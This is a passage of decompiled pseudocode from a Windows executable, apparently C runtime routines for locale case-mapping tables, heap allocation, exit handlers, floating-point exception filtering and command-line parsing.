		fn0040AE68(fp - 0x04, 0x01, fp - 0x0118, 0x0100, fp - 0x0518, globals->t494C38, globals->t494E64, 0x00);
		word32 ecx_137;
		fn00408A01(fp - 0x04, globals->t494E64, 0x0100, 0x01, fp - 0x0118, 0x0100, fp - 0x0218, (CHAR *) 0x0100, globals->t494C38, 0x00, out ecx_137);
		word32 ecx_160;
		fn00408A01(fp - 0x04, globals->t494E64, 0x0200, 0x02, fp - 0x0118, 0x0100, fp - 0x0318, (CHAR *) 0x0100, globals->t494C38, 0x00, out ecx_160);
		struct Eq_6678 * eax_163 = null;
		word16 * ecx_167 = fp - 0x0518;
		do
		{
			byte dl_195;
			byte dl_177 = (byte) *ecx_167;
			if ((dl_177 & 0x01) != 0x00)
			{
				eax_163[0x00494D61] = (struct Eq_6678) (eax_163[0x00494D61] | 0x10);
				dl_195 = Mem201[fp - 0x0218 + eax_163:byte];
				goto l004088E2;
			}
			if ((dl_177 & 0x02) != 0x00)
			{
				eax_163[0x00494D61] = (struct Eq_6678) (eax_163[0x00494D61] | 0x20);
				dl_195 = Mem211[fp - 0x0318 + eax_163:byte];
l004088E2:
				eax_163[4803680] = (struct Eq_6678) dl_195;
			}
			else
				eax_163[4803680] = (struct Eq_6678) (eax_163[4803680] & 0x00);
			eax_163 = eax_163 + 0x01;
			ecx_167 = ecx_167 + 0x01;
		} while (eax_163 < (struct Eq_6678 *) 0x0100);
	}
	else
	{
		struct Eq_6597 * eax_289 = null;
		byte al_290 = 0x00;
		do
		{
			byte cl_343;
			if (eax_289 >= (struct Eq_6597 *) 0x41 && eax_289 <= (struct Eq_6597 *) 0x5A)
			{
				eax_289[0x00494D61] = (struct Eq_6597) (eax_289[0x00494D61] | 0x10);
				cl_343 = al_290 + 0x20;
				goto l0040892C;
			}
			if (eax_289 >= (struct Eq_6597 *) 0x61 && eax_289 <= (struct Eq_6597 *) 122)
			{
				eax_289[0x00494D61] = (struct Eq_6597) (eax_289[0x00494D61] | 0x20);
				cl_343 = al_290 - 0x20;
l0040892C:
				eax_289[4803680] = (struct Eq_6597) cl_343;
			}
			else
				eax_289[4803680] = (struct Eq_6597) (eax_289[4803680] & 0x00);
			eax_289 = eax_289 + 0x01;
			al_290 = (byte) eax_289;
		} while (eax_289 < (struct Eq_6597 *) 0x0100);
	}
}

// 0040895B: Register word32 fn0040895B()
word32 fn0040895B()
{
	if (globals->dw494C28 == 0x00)
	{
		ebx = DPB(ebx, fn00408597(~0x02), 0);
		globals->dw494C28 = 0x01;
	}
	return ebx;
}

// 00408977: Register (ptr byte) fn00408977(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack (ptr (arr Eq_2)) dwArg0C)
byte * fn00408977(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 * dwArg0C[])
{
	byte * edi_102 = (word32) dwArg04 + 0x01;
	if (globals->dw494C4C == 0x00)
		ecx = fn0040AFC0(dwArg04, dwArg08, dwArg0C);
	else
	{
		Eq_2 (* edx_105)[] = dwArg0C;
		if (dwArg0C != null)
		{
			ecx = (word32) dwArg08 + 0x01;
			do
			{
				byte al_103 = *ecx;
				*edi_102 = al_103;
				edx_105 = edx_105 - 0x01;
				if ((((word32) al_103)->b494D61 & 0x04) != 0x00)
				{
					edi_102 = edi_102;
					ecx = ecx;
					if (edx_105 == null)
					{
						*(edi_102 - 0x01) = *(edi_102 - 0x01) & 0x00;
						break;
					}
					byte al_123 = *ecx;
					*edi_102 = al_123;
					edx_105 = edx_105 - 0x01;
					edi_102 = edi_102 + 0x01;
					ecx = ecx + 0x01;
					if (al_123 == 0x00)
					{
						*(edi_102 - 0x01) = *(edi_102 - 0x01) & 0x00;
						break;
					}
				}
				else
				{
					edi_102 = edi_102 + 0x01;
					ecx = ecx + 0x01;
					if (al_103 == 0x00)
						break;
				}
			} while (edx_105 != null);
		}
		uint32 edx_62 = edx_105 - 0x01;
		if (edx_105 != null)
		{
			uint32 ecx_82 = edx_62 + 0x01 >> 0x02;
			while (ecx_82 != 0x00)
			{
				*edi_102 = (byte) 0x00;
				edi_102 = edi_102 + 0x04;
				ecx_82 = ecx_82 - 0x01;
			}
			ecx = edx_62 + 0x01 & 0x03;
			while (ecx != null)
			{
				*edi_102 = 0x00;
				edi_102 = edi_102 + 0x01;
				ecx = ecx - 0x01;
			}
		}
	}
	return ecx;
}

// 00408A01: Register Eq_3320 fn00408A01(Register ptr32 ebp, Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack byte bArg09, Stack Eq_2 dwArg0C, Stack int32 dwArg10, Stack ptr32 dwArg14, Stack Eq_3320 dwArg18, Stack Eq_430 dwArg1C, Stack word32 dwArg20, Register out ptr32 ecxOut)
LPCH fn00408A01(ptr32 ebp, Eq_2 dwArg04, Eq_2 dwArg08, byte bArg09, Eq_2 dwArg0C, int32 dwArg10, ptr32 dwArg14, LPCH dwArg18, Eq_430 dwArg1C, word32 dwArg20, ptr32 & ecxOut)
{
	Eq_3320 eax_109;
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	ptr32 esp_130 = fp - 0x3C;
	if (globals->dw493930 == 0x00)
	{
		esp_130 = fp - 0x54;
		if (LCMapStringW(0x00, 0x0100, &globals->t40D250, 0x01, null, 0x00) != null)
			globals->dw493930 = 0x01;
		else
		{
			esp_130 = fp - 0x6C;
			if (LCMapStringA(0x00, 0x0100, 4248140, 0x01, 0x00, null) == null)
				goto l00408B8F;
			globals->dw493930 = 0x02;
		}
	}
	if (dwArg10 > 0x00)
	{
		int32 * esp_372 = esp_130 - 0x04;
		*esp_372 = dwArg10;
		*(esp_372 - 0x04) = (union Eq_2 *) dwArg0C;
		dwArg10 = fn00408C25(dwArg00, dwArg04);
	}
	word32 eax_138 = globals->dw493930;
	if (eax_138 == 0x02)
	{
		LPCH * esp_144 = esp_130 - 0x04;
		*esp_144 = (LPCH *) dwArg18;
		*(esp_144 - 0x04) = dwArg14;
		*(esp_144 - 0x08) = dwArg10;
		*(esp_144 - 0x0C) = (union Eq_2 *) dwArg0C;
		*(esp_144 - 0x10) = (union Eq_2 *) dwArg08;
		*(esp_144 - 0x14) = (union Eq_2 *) dwArg04;
		eax_109 = LCMapStringA(*(esp_144 - 0x14), *(esp_144 - 0x10), *(esp_144 - 0x0C), *(esp_144 - 0x08), *(esp_144 - 0x04), *esp_144);
		goto l00408B91;
	}
	if (eax_138 == 0x01)
	{
		if (dwArg1C == 0x00)
			dwArg1C = globals->t49394C;
		int32 * esp_177 = esp_130 - 0x04;
		*esp_177 = 0x00;
		*(esp_177 - 0x04) = 0x00;
		*(esp_177 - 0x08) = dwArg10;
		*(esp_177 - 0x0C) = (union Eq_2 *) dwArg0C;
		*(esp_177 - 0x10) = (0x00 - (-dwArg20 == 0x00) & 0x08) + 0x01;
		*(esp_177 - 0x14) = (union Eq_430 *) dwArg1C;
		int32 eax_199 = MultiByteToWideChar(*(esp_177 - 0x14), *(esp_177 - 0x10), *(esp_177 - 0x0C), *(esp_177 - 0x08), *(esp_177 - 0x04), *esp_177);
		if (eax_199 == 0x00)
			goto l00408B8F;
		word32 eax_206 = eax_199 * 0x02 + 0x03;
		fn00407F60(DPB(eax_206, (byte) eax_206 & 252, 0), ebp);
		if (esp_177 == (int32 *) 0x14)
			goto l00408B8F;
		*(esp_177 - 0x18) = eax_199;
		*(esp_177 - 0x1C) = esp_177 - 0x14;
		*(esp_177 - 0x20) = dwArg10;
		*(esp_177 - 0x24) = (union Eq_2 *) dwArg0C;
		*(esp_177 - 0x28) = 0x01;
		*(esp_177 - 44) = (union Eq_430 *) dwArg1C;
		if (MultiByteToWideChar(*(esp_177 - 44), *(esp_177 - 0x28), *(esp_177 - 0x24), *(esp_177 - 0x20), *(esp_177 - 0x1C), *(esp_177 - 0x18)) != 0x00)
		{
			*(esp_177 - 0x30) = 0x00;
			*(esp_177 - 0x34) = 0x00;
			*(esp_177 - 0x38) = eax_199;
			*(esp_177 - 0x3C) = esp_177 - 0x14;
			*(esp_177 - 0x40) = (union Eq_2 *) dwArg08;
			*(esp_177 - 0x44) = (union Eq_2 *) dwArg04;
			Eq_3320 eax_256 = LCMapStringW(*(esp_177 - 0x44), *(esp_177 - 0x40), *(esp_177 - 0x3C), *(esp_177 - 0x38), *(esp_177 - 0x34), *(esp_177 - 0x30));
			Eq_3320 esi_257 = eax_256;
			if (eax_256 == null)
				goto l00408B8F;
			if ((bArg09 & 0x04) != 0x00)
			{
				if (dwArg18 != null)
				{
					if (eax_256 > dwArg18)
						goto l00408B8F;
					*(esp_177 - 0x48) = (LPCH *) dwArg18;
					*(esp_177 - 0x4C) = dwArg14;
					*(esp_177 - 0x50) = eax_199;
					*(esp_177 - 0x54) = esp_177 - 0x14;
					*(esp_177 - 88) = (union Eq_2 *) dwArg08;
					*(esp_177 - 0x5C) = (union Eq_2 *) dwArg04;
					if (LCMapStringW(*(esp_177 - 0x5C), *(esp_177 - 88), *(esp_177 - 0x54), *(esp_177 - 0x50), *(esp_177 - 0x4C), *(esp_177 - 0x48)) == null)
						goto l00408B8F;
				}
			}
			else
			{
				word32 eax_304 = eax_256 * 0x02 + 0x03;
				fn00407F60(DPB(eax_304, (byte) eax_304 & 252, 0), ebp);
				if (esp_177 == (int32 *) 0x44)
					goto l00408B8F;
				*(esp_177 - 0x48) = (LPCH *) eax_256;
				*(esp_177 - 0x4C) = esp_177 - 0x44;
				*(esp_177 - 0x50) = eax_199;
				*(esp_177 - 0x54) = esp_177 - 0x14;
				*(esp_177 - 88) = (union Eq_2 *) dwArg08;
				*(esp_177 - 0x5C) = (union Eq_2 *) dwArg04;
				if (LCMapStringW(*(esp_177 - 0x5C), *(esp_177 - 88), *(esp_177 - 0x54), *(esp_177 - 0x50), *(esp_177 - 0x4C), *(esp_177 - 0x48)) == null)
					goto l00408B8F;
				*(esp_177 - 0x60) = 0x00;
				*(esp_177 - 100) = 0x00;
				if (dwArg18 == null)
				{
					*(esp_177 - 0x68) = 0x00;
					*(esp_177 - 0x6C) = 0x00;
				}
				else
				{
					*(esp_177 - 0x68) = (LPCH *) dwArg18;
					*(esp_177 - 0x6C) = dwArg14;
				}
				struct Eq_7543 * esp_345 = esp_130 - 0x70;
				*(esp_345 - 0x04) = (LPCH *) eax_256;
				*(esp_345 - 0x08) = esp_177 - 0x44;
				*(esp_345 - 0x0C) = 0x0220;
				*(esp_345 - 0x10) = (union Eq_430 *) dwArg1C;
				Eq_3320 eax_355 = WideCharToMultiByte(*(esp_345 - 0x10), *(esp_345 - 0x0C), *(esp_345 - 0x08), *(esp_345 - 0x04), esp_345->t0000, esp_345->dw0004, esp_345->t0008, esp_345->t000C);
				esi_257 = eax_355;
				if (eax_355 == null)
					goto l00408B8F;
			}
			eax_109 = esi_257;
l00408B91:
			fs->ptr0000 = eax_14;
			word32 ecx_72;
			*ecxOut = eax_14;
			return eax_109;
		}
	}
l00408B8F:
	eax_109 = null;
	goto l00408B91;
}

// 00408C25: Register Eq_2 fn00408C25(Stack (ptr byte) dwArg04, Stack Eq_2 dwArg08)
Eq_2 fn00408C25(byte * dwArg04, Eq_2 dwArg08)
{
	byte * eax_16 = dwArg04;
	word32 ecx_12 = dwArg08 - 0x01;
	if (dwArg08 != 0x00)
	{
		while (*eax_16 != 0x00)
		{
			eax_16 = eax_16 + 0x01;
			ecx_12 = ecx_40 - 0x01;
			word32 ecx_40 = ecx_12;
			if (ecx_40 == 0x00)
				break;
		}
	}
	if (*eax_16 != 0x00)
		return dwArg08;
	else
		return eax_16 - dwArg04;
}

// 00408C50: Register ui32 fn00408C50(Stack Eq_5408 dwArg04, Stack word16 wArg06, Stack ui32 dwArg08)
ui32 fn00408C50(Eq_5408 dwArg04, word16 wArg06, ui32 dwArg08)
{
	ui32 eax_122;
	if (dwArg04 <= ~0xFE)
		eax_122 = (word32) globals->ptr412A10[dwArg04].t0000;
	else
	{
		word32 dwLoc0C_131;
		if ((globals->ptr412A10[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
			dwLoc0C_131 = 0x02;
		else
			dwLoc0C_131 = 0x01;
		ui32 eax_112 = fn0040AE68(fp - 0x04, 0x01, fp - 0x08, dwLoc0C_131, fp + 0x06, 0x00, 0x00, 0x01);
		if (eax_112 == 0x00)
			return eax_112;
		eax_122 = (word32) wArg06;
	}
	return eax_122 & dwArg08;
}

// 004095E4: Register word32 fn004095E4(Register Eq_3320 ebp, Stack Eq_2 dwArg04, Register out ptr32 ebpOut, Register out ptr32 ediOut)
word32 fn004095E4(LPCH ebp, Eq_2 dwArg04, ptr32 & ebpOut, ptr32 & ediOut)
{
	*ebpOut = ebp;
	*ediOut = edi;
	if (dwArg04 != 0x00)
	{
		Eq_2 eax_44 = fn0040B5B3(dwArg04);
		if (eax_44 != 0x00)
		{
			fn0040B5DE(ebp, eax_44, dwArg04, bLoc05);
			return ebx;
		}
		HeapFree(globals->t494B04, 0x00, dwArg04);
	}
	return ebx;
}

// 00409613: Register word32 fn00409613(Register Eq_3320 ebp, Stack Eq_2 dwArg04, Register out ptr32 ebxOut, Register out Eq_7718 esiOut, Register out (ptr (ptr Eq_8279)) ediOut)
word32 fn00409613(LPCH ebp, Eq_2 dwArg04, ptr32 & ebxOut, Eq_7718 & esiOut, Eq_8279 * * & ediOut)
{
	word32 ebx_11;
	word32 esi_12;
	word32 edi_13;
	return fn00409625(ebp, dwArg04, out ebx_11, out esi_12, out edi_13);
}

// 00409625: Register word32 fn00409625(Register Eq_3320 ebp, Stack Eq_2 dwArg04, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00409625(LPCH ebp, Eq_2 dwArg04, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	*ebxOut = ebx;
	*ediOut = edi;
	*esiOut = esi;
	word32 eax_15;
	if (dwArg04 <= ~0x1F)
	{
		do
		{
			*(fp - 0x04) = fp->dw0004;
			word32 ebx_39;
			word32 edi_40;
			eax_15 = fn00409651(ebp, dwArg00, out ebx_39, out edi_40);
			if (eax_15 != 0x00 || fp->dw0008 == eax_15)
				return eax_15;
			*(fp - 0x04) = fp->dw0004;
		} while (fn0040BDBE(dwArg00) != 0x00);
	}
	eax_15 = 0x00;
	return eax_15;
}

// 00409651: Register Eq_2 fn00409651(Register Eq_3320 ebp, Stack uint32 dwArg04, Register out ptr32 ebxOut, Register out ptr32 ediOut)
Eq_2 fn00409651(LPCH ebp, uint32 dwArg04, ptr32 & ebxOut, ptr32 & ediOut)
{
	*ebxOut = ebx;
	*ediOut = edi;
	Eq_2 eax_24;
	uint32 esi_41 = dwArg04;
	if (dwArg04 <= globals->dw413020)
	{
		byte bl_62;
		eax_24 = fn0040B909(ebp, dwArg04, dwArg04, SLICE(dwArg04, byte, 24), out bl_62);
		if (eax_24 != 0x00)
			return eax_24;
	}
	if (dwArg04 == 0x00)
		esi_41 = 0x01;
	eax_24 = HeapAlloc(globals->t494B04, 0x00, esi_41 + 0x0F & ~0x0F);
	return eax_24;
}

// 0040A20C: Register word32 fn0040A20C()
word32 fn0040A20C()
{
	ptr32 esp_1 = fp;
	<anonymous> * eax_3 = globals->ptr494C34;
	if (eax_3 != null)
	{
		word32 eax_27;
		byte SZO_28;
		byte C_29;
		byte Z_30;
		byte SCZO_31;
		eax_3();
	}
	word32 * esp_14 = esp_1 - 0x04;
	*esp_14 = 0x0040F014;
	*(esp_14 - 0x04) = 0x0040F008;
	fn0040A2F4(dwArg00);
	*(esp_14 - 0x08) = 0x0040F004;
	*(esp_14 - 0x0C) = 0x0040F000;
	fn0040A2F4(dwArg00);
	return esi;
}

// 0040A239: void fn0040A239(Register word32 ebx, Register word32 esi, Register word32 edi, Stack Eq_430 dwArg04)
void fn0040A239(word32 ebx, word32 esi, word32 edi, Eq_430 dwArg04)
{
	fn0040A25B(ebx, esi, edi, dwArg04);
}

// 0040A25B: void fn0040A25B(Register word32 ebx, Register word32 esi, Register word32 edi, Stack Eq_430 dwArg04)
void fn0040A25B(word32 ebx, word32 esi, word32 edi, Eq_430 dwArg04)
{
	struct Eq_7870 * esp_134 = fp - 0x04;
	if (globals->dw49399C == 0x01)
	{
		TerminateProcess(GetCurrentProcess(), dwArg04);
		esp_134 = fp - 0x0C;
	}
	struct Eq_7878 * esp_20 = esp_134 - 0x04;
	esp_20->dw0000 = ebx;
	word32 ebx_112 = esp_20->dw0014;
	globals->dw493998 = 0x01;
	globals->b493994 = (byte) ebx_112;
	if (esp_134->dw000C == 0x00)
	{
		word32 * eax_55 = globals->ptr494C30;
		if (eax_55 != null)
		{
			uint32 ecx_77 = globals->dw494C2C;
			*(esp_20 - 0x04) = esi;
			ptr32 esp_101 = esp_20 - 0x04;
			word32 * esi_108 = ecx_77 - 0x04;
			if (ecx_77 - 0x04 >= eax_55)
			{
				do
				{
					<anonymous> * eax_102 = *esi_108;
					if (eax_102 != null)
					{
						word32 edi_119;
						byte SCZO_120;
						byte Z_121;
						word32 eax_122;
						byte bl_124;
						byte SZO_125;
						byte C_126;
						word32 ecx_127;
						eax_102();
					}
					esi_108 = esi_108 - 0x04;
				} while (esi_108 >= globals->ptr494C30);
			}
			esp_20 = esp_101 + 0x04;
		}
		word32 * esp_69 = esp_20 - 0x04;
		*esp_69 = 0x0040F020;
		*(esp_69 - 0x04) = 0x0040F018;
		fn0040A2F4(dwArg00);
		esp_20 = (struct Eq_7878 *) (esp_69 + 0x01);
	}
	struct Eq_7908 * esp_35 = esp_20 - 0x04;
	esp_35->dw0000 = 0x0040F028;
	*(esp_35 - 0x04) = 0x0040F024;
	fn0040A2F4(dwArg00);
	if (ebx_112 != 0x00)
		;
	else
	{
		esp_35->t0004 = esp_35->t0010;
		globals->dw49399C = 0x01;
		ExitProcess(esp_35->t0004);
	}
}

// 0040A2F4: void fn0040A2F4(Stack (ptr word32) dwArg04)
void fn0040A2F4(word32 * dwArg04)
{
	struct Eq_7997 * esp_13 = fp - 0x04;
	word32 * esi_14 = dwArg04;
	while (esi_14 < esp_13->ptr000C)
	{
		<anonymous> * eax_18 = *esi_14;
		if (eax_18 != null)
		{
			byte SCZO_32;
			byte C_33;
			word32 eax_34;
			byte SZO_35;
			byte Z_36;
			eax_18();
		}
		esi_14 = esi_14 + 0x01;
	}
}

// 0040A30E: Register Eq_2 fn0040A30E(Stack Eq_430 dwArg04, Stack (ptr Eq_6150) dwArg08)
Eq_2 fn0040A30E(Eq_430 dwArg04, _EXCEPTION_POINTERS * dwArg08)
{
	Eq_2 eax_31;
	struct _EXCEPTION_POINTERS * eax_107 = fn0040A44F(dwArg04);
	if (eax_107 != null)
	{
		<anonymous> * ebx_53 = eax_107->ptr0008;
		if (ebx_53 != null)
		{
			if (ebx_53 == (<anonymous> *) 0x05)
			{
				eax_107->ptr0008 = eax_107->ptr0008 & 0x00;
				eax_31.u0 = 0x01;
			}
			else
			{
				if (ebx_53 != (<anonymous> *) 0x01)
				{
					struct _EXCEPTION_POINTERS * ecx_86 = globals->ptr4939A0;
					globals->ptr4939A0 = dwArg08;
					word32 ecx_90 = eax_107->ContextRecord;
					if (ecx_90 == 0x08)
					{
						int32 ecx_109 = globals->dw412CB8;
						int32 edx_111 = globals->dw412CBC + ecx_109;
						if (ecx_109 < edx_111)
						{
							int32 edx_166 = edx_111 - ecx_109;
							struct Eq_8100 * esi_168 = ecx_109 * 0x03 * 0x04 + 4271176;
							do
							{
								esi_168->dw0000 = esi_168->dw0000 & 0x00;
								esi_168 = esi_168 + 0x01;
								edx_166 = edx_166 - 0x01;
							} while (edx_166 != 0x00);
						}
						word32 eax_118 = eax_107->ExceptionRecord;
						if (eax_118 == 0xC000008E)
							globals->dw412CC4 = 131;
						else if (eax_118 == 0xC0000090)
							globals->dw412CC4 = 0x81;
						else if (eax_118 == 0xC0000091)
							globals->dw412CC4 = 0x84;
						else if (eax_118 == 0xC0000093)
							globals->dw412CC4 = 133;
						else if (eax_118 == 0xC000008D)
							globals->dw412CC4 = 0x82;
						else if (eax_118 == 0xC000008F)
							globals->dw412CC4 = 0x86;
						else if (eax_118 == 0xC0000092)
							globals->dw412CC4 = 0x8A;
						word32 esp_127;
						word32 ebp_128;
						word32 ebx_129;
						word32 eax_130;
						byte SZO_131;
						byte C_132;
						word32 ecx_133;
						byte Z_134;
						byte SCZO_135;
						word32 edx_136;
						word32 esi_137;
						byte SO_138;
						ebx_53();
						globals->dw412CC4 = esi_137;
					}
					else
					{
						eax_107->ptr0008 = eax_107->ptr0008 & 0x00;
						word32 esp_185;
						word32 ebp_186;
						word32 ebx_187;
						word32 eax_188;
						byte SZO_189;
						byte C_190;
						word32 ecx_191;
						byte Z_192;
						byte SCZO_193;
						word32 edx_194;
						word32 esi_195;
						byte SO_196;
						ebx_53();
					}
					globals->ptr4939A0 = ecx_86;
					eax_107 = ecx_86;
				}
				eax_31 = eax_107 | ~0x00;
			}
			return eax_31;
		}
	}
	eax_31 = UnhandledExceptionFilter(dwArg08);
	return eax_31;
}

// 0040A44F: Register (ptr Eq_8170) fn0040A44F(Stack Eq_430 dwArg04)
Eq_8170 * fn0040A44F(Eq_430 dwArg04)
{
	ui32 ecx_5 = globals->dw412CC0;
	struct Eq_8170 * eax_11 = &globals->t412C40;
	if (globals->t412C40 != dwArg04)
	{
		struct Eq_8170 * esi_34 = ecx_5 * 0x03 * 0x04 + 0x00412C40;
		do
			eax_11 = eax_11 + 0x01;
		while (eax_11 < esi_34 && eax_11->dw0000 != dwArg04);
	}
	if (eax_11 >= (ecx_5 * 0x03) * 0x04 + 0x00412C40 || eax_11->dw0000 != dwArg04)
		eax_11 = null;
	return eax_11;
}

// 0040A492: Register Eq_2 fn0040A492()
Eq_2 fn0040A492()
{
	if (globals->dw494C28 == 0x00)
		fn0040895B();
	Eq_2 esi_10 = globals->t494E68;
	cu8 al_11 = *esi_10;
	if (al_11 == 0x22)
	{
		while (true)
		{
			byte al_59 = *((word32) esi_10 + 0x01);
			esi_10 = (word32) esi_10 + 0x01;
			if (al_59 == 0x22 || al_59 == 0x00)
				break;
			if (fn0040C056((word32) al_59) != 0x00)
				esi_10 = (word32) esi_10 + 0x01;
		}
		if (*esi_10 == 0x22)
		{
l0040A4CF:
			esi_10 = (word32) esi_10 + 0x01;
		}
	}
	else if (al_11 > 0x20)
	{
		do
			esi_10 = (word32) esi_10 + 0x01;
		while (*esi_10 > 0x20);
	}
	cu8 al_27 = *esi_10;
	if (al_27 == 0x00 || al_27 > 0x20)
		return esi_10;
	goto l0040A4CF;
}

// 0040A4EA: Register Eq_3320 fn0040A4EA(Register word32 ebx, Register Eq_3320 ebp)
LPCH fn0040A4EA(word32 ebx, LPCH ebp)
{
	byte bl_111 = 0x00;
	if (globals->dw494C28 == 0x00)
		bl_111 = (byte) fn0040895B();
	Eq_2 esi_18 = globals->t493920;
	ui32 edi_19 = 0x00;
	while (true)
	{
		byte al_32 = *esi_18;
		if (al_32 == bl_111)
			break;
		if (al_32 != 0x3D)
			edi_19 = edi_19 + 0x01;
		esi_18 = (word32) fn00407840(esi_18) + ((word32) esi_18 + 0x01);
	}
	struct Eq_8279 * ebx_52;
	word32 esi_53;
	Eq_2 edi_54;
	struct Eq_8279 * eax_55 = fn00409613(ebp, edi_19 * 0x04 + 0x04, out ebx_52, out esi_53, out edi_54);
	globals->ptr49397C = eax_55;
	struct Eq_8279 * esi_101 = eax_55;
	if (eax_55 == ebx_52)
	{
		*(fp - 0x10) = 0x09;
		word32 edi_162;
		bl_111 = fn0040854E(ebp, edi_54, out esi_101, out edi_162);
	}
	Eq_2 edi_113 = globals->t493920;
	if (*edi_113 != bl_111)
	{
		*(fp - 0x10) = (LPCH *) ebp;
		do
		{
			*(fp - 0x14) = (union Eq_2 *) edi_113;
			Eq_2 eax_104 = fn00407840(dwArg00);
			if (*edi_113 != 0x3D)
			{
				*(fp - 0x14) = (word32) eax_104 + 0x01;
				struct Eq_8279 * ebx_125;
				Eq_2 edi_127;
				struct Eq_8279 ** esi_126;
				struct Eq_8279 * eax_128 = fn00409613((word32) eax_104 + 0x01, dwArg00, out ebx_125, out esi_126, out edi_127);
				*esi_126 = (struct Eq_8279 **) eax_128;
				if (eax_128 == ebx_125)
				{
					*(fp - 0x14) = 0x09;
					bl_111 = fn0040854E((word32) eax_104 + 0x01, edi_127, out esi_126, out edi_127);
				}
				*(fp - 0x14) = (union Eq_2 *) edi_127;
				*(fp - 0x18) = *esi_126;
				edi_113 = fn00407750(dwArg00);
				esi_101 = (struct Eq_8279 *) ((char *) esi_126 + 0x04);
			}
			edi_113 = (word32) edi_113 + ((word32) eax_104 + 0x01);
		} while (*edi_113 != bl_111);
		ebp = (Eq_3320) *(fp - 0x10);
	}
	*(fp - 0x10) = (union Eq_2 *) globals->t493920;
	Eq_3320 ebp_81;
	word32 edi_82;
	Eq_2 ebx_83 = fn004095E4(ebp, dwArg00, out ebp_81, out edi_82);
	globals->t493920 = ebx_83;
	esi_101->t0000 = ebx_83;
	globals->dw494C24 = 0x01;
	return ebp_81;
}

// 0040A5A3: Register word32 fn0040A5A3(Register ui32 ecx, Register ptr32 ebp)
word32 fn0040A5A3(ui32 ecx, ptr32 ebp)
{
	Eq_2485 ebx_113 = null;
	byte bl_114 = 0x00;
	if (globals->dw494C28 == 0x00)
	{
		ebx_113 = fn0040895B();
		bl_114 = (byte) ebx_113;
	}
	GetModuleFileNameA(ebx_113, 4798884, 0x0104);
	Eq_2 eax_35 = globals->t494E68;
	globals->dw49398C = 4798884;
	Eq_2 edi_112 = 4798884;
	if (*eax_35 != bl_114)
		edi_112 = eax_35;
	fn0040A63C(edi_112, ebx_113, ebx_113, fp - 0x08, fp - 0x0C);
	struct Eq_8279 * ebx_58;
	word32 esi_59;
	Eq_2 edi_108;
	struct Eq_8279 * eax_61 = fn00409613(fp - 0x04, ecx * 0x05, out ebx_58, out esi_59, out edi_108);
	struct Eq_8279 * esi_107 = eax_61;
	if (eax_61 == ebx_58)
	{
		*(fp - 0x28) = 0x08;
		fn0040854E(fp - 0x04, edi_108, out esi_107, out edi_108);
	}
	*(fp - 0x28) = fp - 0x0C;
	*(fp - 44) = fp - 0x08;
	*(fp - 0x30) = esi_107 + (ecx * 0x04) / 0x08;
	*(fp - 0x34) = (struct Eq_8279 **) esi_107;
	*(fp - 0x38) = (union Eq_2 *) edi_108;
	fn0040A63C(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	globals->ptr493974 = esi_107;
	globals->dw493970 = ecx - 0x01;
	return *(fp - 0x1C);
}

// 0040A63C: void fn0040A63C(Stack Eq_2 dwArg04, Stack Eq_2485 dwArg08, Stack Eq_2485 dwArg0C, Stack (ptr word32) dwArg10, Stack (ptr ui32) dwArg14)
void fn0040A63C(Eq_2 dwArg04, HMODULE dwArg08, HMODULE dwArg0C, word32 * dwArg10, ui32 * dwArg14)
{
	*dwArg14 = *dwArg14 & 0x00;
	*dwArg10 = 0x01;
	Eq_2485 esi_122 = dwArg0C;
	Eq_2485 edi_109 = dwArg08;
	struct Eq_8560 * eax_119 = (word32) dwArg04 + 0x01;
	if (dwArg08 != null)
	{
		dwArg08->unused = (int32) dwArg0C;
		edi_109 = (Eq_2485) (&dwArg08->unused + 0x01);
		dwArg08 = (Eq_2485) (&dwArg08->unused + 0x01);
	}
	if (*dwArg04 == 0x22)
	{
		while (true)
		{
			byte dl_293 = eax_119[0x01];
			eax_119 = eax_119 + 0x01;
			if (dl_293 == 0x22 || dl_293 == 0x00)
				break;
			if ((((word32) dl_293)->b494D61 & 0x04) != 0x00)
			{
				*dwArg14 = *dwArg14 + 0x01;
				if (esi_122 != null)
				{
					esi_122->unused = (int32) eax_119->b0000;
					esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
					eax_119 = eax_119 + 0x01;
				}
			}
			*dwArg14 = *dwArg14 + 0x01;
			if (esi_122 != null)
			{
				esi_122->unused = (int32) eax_119->b0000;
				esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
			}
		}
		*dwArg14 = *dwArg14 + 0x01;
		if (esi_122 != null)
		{
			esi_122->unused = (int32) (esi_122->unused & 0x00);
			esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
		}
		if (eax_119->b0000 == 0x22)
			eax_119 = eax_119 + 0x01;
	}
	else
	{
		do
		{
			*dwArg14 = *dwArg14 + 0x01;
			if (esi_122 != null)
			{
				esi_122->unused = (int32) eax_119->b0000;
				esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
			}
			byte dl_358 = eax_119->b0000;
			eax_119 = &eax_119->b0000;
			if ((((word32) dl_358)->b494D61 & 0x04) != 0x00)
			{
				*dwArg14 = *dwArg14 + 0x01;
				if (esi_122 != null)
				{
					esi_122->unused = (int32) eax_119->b0000;
					esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
				}
				eax_119 = eax_119 + 0x01;
			}
			if (dl_358 == 0x20)
				break;
			if (dl_358 == 0x00)
				goto l0040A6E7;
		} while (dl_358 != 0x09);
		if (dl_358 == 0x00)
		{
l0040A6E7:
			eax_119 = eax_119 - 0x01;
		}
		else if (esi_122 != null)
			*(esi_122 - 0x01) = *(esi_122 - 0x01) & 0x00;
	}
	ui32 dwArg14_116 = dwArg14 & 0x00;
	while (eax_119->b0000 != 0x00)
	{
		while (true)
		{
			byte dl_93 = eax_119->b0000;
			if (dl_93 != 0x20 && dl_93 != 0x09)
				break;
			eax_119 = eax_119 + 0x01;
		}
		if (eax_119->b0000 == 0x00)
			break;
		if (edi_109 != null)
		{
			edi_109->unused = (int32) esi_122;
			edi_109 = (Eq_2485) (&edi_109->unused + 0x01);
			dwArg08 = edi_109;
		}
		*dwArg10 = *dwArg10 + 0x01;
l0040A728:
